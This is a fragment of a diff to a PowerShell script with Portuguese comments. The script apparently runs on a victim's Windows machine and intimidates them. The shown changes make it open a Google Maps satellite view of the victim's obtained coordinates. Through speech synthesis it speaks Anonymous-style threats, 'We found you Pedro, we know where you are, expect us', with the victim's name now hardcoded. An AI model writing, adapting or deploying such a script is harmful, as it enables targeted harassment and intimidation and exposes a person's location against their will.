@@ -83,10 +83,10 @@ if ($GeoLocation) {
 
 Pause-Script
 
-# Abre o navegador com um mapa da localizacao atual (somente se as coordenadas foram obtidas)
+# Abre o Google Maps com a localizacao atual (somente se as coordenadas foram obtidas)
 
 if ($Lat -and $Lon) {
-    Start-Process "https://www.latlong.net/c/?lat=$Lat&long=$Lon"
+    Start-Process "https://www.google.com/maps/place/$Lat,$Lon/@$Lat,$Lon,19z/data=!3m1!1e3"
 }
 
 Start-Sleep -s 3
@@ -99,10 +99,10 @@ $k = [Math]::Ceiling(100/2); $o = New-Object -ComObject WScript.Shell; for ($i =
 
 $s = New-Object -ComObject SAPI.SpVoice
 $s.Rate = -2
-$s.Speak("Nós encontramos você $FN")
+$s.Speak("Nós encontramos você Pedro")
 $s.Speak("Nós sabemos onde você esta")
 $s.Speak("Nós estamos em todos os lugares")
-$s.Speak("Nós não perdoamos, Nós não esquecemos")
+$s.Speak("Nós não perdoamos, Nós nao esquecemos")
 $s.Speak("Espere por Nós")
 
 # Fim do script. Nenhum arquivo, historico ou registro e apagado.
